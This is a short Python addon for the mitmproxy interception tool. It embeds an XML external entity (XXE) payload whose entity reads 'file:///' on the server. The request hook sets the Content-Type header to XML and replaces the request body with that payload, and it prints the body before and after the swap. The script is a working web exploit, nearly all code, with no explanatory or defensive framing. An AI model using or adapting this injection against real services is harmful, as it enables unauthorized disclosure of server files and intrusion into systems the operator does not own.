from urllib.parse import urlencode, urlparse
import collections

from mitmproxy import http
from mitmproxy import ctx



XML = b"""
<?xml version="1.0"?>

<!--open the DOCTYPE declaration -
  the open square bracket indicates an internal DTD-->
<!DOCTYPE user [

<!--define the internal DTD-->
    <!ENTITY root SYSTEM "file:///">

<!--close the DOCTYPE declaration-->
]>

<comment><text>&root;test</text></comment>
""".replace(b'\n', b'')

def request(flow: http.HTTPFlow) -> None:
    if 'content-type' in flow.request.url:
        print(flow.request.content)
        flow.request.headers['Content-Type'] = 'application/xml'
        flow.request.content = XML
        print(flow.request.content)

def response(flow: http.HTTPFlow) -> None:
    return
